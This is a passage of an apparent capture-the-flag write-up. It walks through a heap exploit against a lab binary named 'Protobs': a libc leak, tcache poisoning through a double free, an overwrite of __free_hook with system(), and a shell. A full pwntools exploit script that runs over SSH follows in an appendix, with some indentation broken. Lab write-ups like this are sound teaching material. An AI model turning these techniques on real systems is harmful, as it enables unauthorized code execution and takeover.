+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          delete(5)
+          delete(4)
+          create(24, "A" * 24)
+          create(0, "")
+          delete(5)
+
+          libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
+          libc.address = libc_base
+          free_hook = libc.symbols['__free_hook']
+          create((0x100 - 8), p64(free_hook))
+
+          create((0x170 - 8), "test1234")
+          create((0x170 - 8), "AAAAAAAA")
+
+          p.interactive()
+
+If everything works out, we should have the string AAAAAAAAA present at the free hook address.
+
+We were able to successfully overwrite the __free_hook pointer.
+
+Obtaining a Shell
+
+Now all that's left is to overwrite the hook with the address to the system() function and call
+/bin/sh . Let's create a configuration and place /bin/sh in its description.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          delete(5)
+          delete(4)
+          create(24, "A" * 24)
+          create(0, "")
+          delete(5)
+
+          libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
+          libc.address = libc_base
+          free_hook = libc.symbols['__free_hook']
+          create((0x100 - 8), p64(free_hook))
+          create((0x170 - 8), "test1234")
+          system = libc.symbols['system']
+          create((0x170 - 8), p64(system))
+          create(10, '/bin/sh')
+          delete(8)
+          p.interactive()
+We create a new chunk and place /bin/sh in its description. This configuration is then deleted,
+which ends up calling system('/bin/sh') and gives us a shell.
+
+The exploitation was successful and we're given a shell. Let's run this on the box by using the SSH
+utility in pwntools.
+The final script can be found in the Appendix.
+Appendix
+
+#!/usr/bin/python3
+
+from pwn import *
+
+gdbscript = '''
+stub sleep
+c
+'''
+
+s = ssh(host='10.10.10.170', user='observer', keyfile='id_rsa')
+p = s.process("/opt/Configuration_Utility/Protobs")
+
+# Uncomment below for local debugging
+# gdb.attach(p, gdbscript)
+# p = process("/opt/Configuration_Utility/Protobs")
+
+def create(size, description, name='test', contrast='1', gamma='2', x_axis='3',
+
+y_axis='4', controller='6'):
+
+log.info("Creating configuration")
+
+p.sendlineafter("protobs@player2:~$ ", "2")
+
+p.sendlineafter(" [ Game            ]: ", name)
+
+p.sendlineafter(" [ Contrast        ]: ", contrast)
+
+p.sendlineafter(" [ Gamma           ]: ", gamma)
+
+p.sendlineafter(" [ Resolution X-Axis ]: ", x_axis)
+
+p.sendlineafter(" [ Resolution Y-Axis ]: ", y_axis)
+
+p.sendlineafter(" [ Controller      ]: ", controller)
+
+if size > 0:
+
+p.sendlineafter(" [ Size of Description ]: ", str(size))
+
+p.sendlineafter(" [ Description              ]: ", description)
+
+else:
+
+p.sendlineafter(" [ Size of Description ]: ", str(size))
+
+def read(index):
+       log.info(f"Reading configuration at index: {index}")
+       p.sendlineafter("protobs@player2:~$ ", "3")
+       p.sendlineafter(" [ Config Index ]: ", str(index))
+       return '\n'.join(p.recvlinesS(8))
+
+def delete(index):
+       log.info(f"Deleting configuration at index: {index}")
+       p.sendlineafter("protobs@player2:~$ ", "4")
+       p.sendlineafter(" [ Config Index ]: ", str(index))
+
+def main():
+       create(10, "test1234")
+       create(1050, "test1234")
+       create(10, "test1234")
+       delete(0)
+       delete(1)
+
+## Leak main_arena address with unsorted bin
+create(0, "")
+leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+       libc_base = leak - 96 - 0x1e4c40
+       log.success(f"Libc base address: {hex(libc_base)}")
+
+       ## Two fake configs to use up existing free chunks
+       create(1050, "test1234")
+       create(10, "test1234")
+
+       ## Setup two adjacent tcache chunks of sizes 0x20 and 0x170, then free them
+both
+
+       create((0x40 - 8), "test1234")
+       delete(4)
+       create(10, "test1234")
+       create(350, "test1234")
+       delete(5)
+       delete(4)
+
+       ## Write null byte to last chunk and then free it for double fee
+       create(24, "A" * 24)
+       create(0, "")
+       delete(5)
+
+       libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
+       libc.address = libc_base
+       free_hook = libc.symbols['__free_hook']
+
+       ## Poison the fd pointer to get free_hook pointer, write system address
+there
+
+       create((0x100 - 8), p64(free_hook))
+
+       create((0x170 - 8), "test1234")
+       system = libc.symbols['system']
+       create((0x170 - 8), p64(system))
+
+       ## Create chunk with '/bin/sh' and free it to trigger the hook
+       create(10, '/bin/sh')
+       delete(8)
+
+       p.interactive(prompt='')
+
+if __name__ == "__main__":
+       main()
+
